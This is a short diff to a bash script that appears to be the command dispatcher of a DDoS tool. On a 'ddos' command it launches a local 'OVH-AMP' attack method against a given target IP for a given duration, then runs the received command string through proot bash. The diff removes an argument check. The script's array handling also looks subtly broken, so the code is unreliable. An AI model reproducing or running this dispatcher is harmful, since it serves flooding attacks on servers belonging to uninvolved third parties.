@@ -54,11 +54,9 @@ if [[ -f "./installed" ]]; then
         fi
         
         if [ "$cmdtorun" == "ddos" ]; then
-            if [ ${cmdtorun[@]} -ge 2 ]; then
-                ~/root/methods/OVH-AMP "${cmdtorun[0]}" "${cmdtorun[1]}"
-            else
-                echo "Error: ddos command requires at least 2 arguments."
-            fi
+            target_ip=${cmdtorun[1]}
+            duration=${cmdtorun[2]}
+            ~/root/methods/OVH-AMP "$target_ip" "$duration"
         fi
         
         ./libraries/proot -S . /bin/bash -c "$cmdtorun"
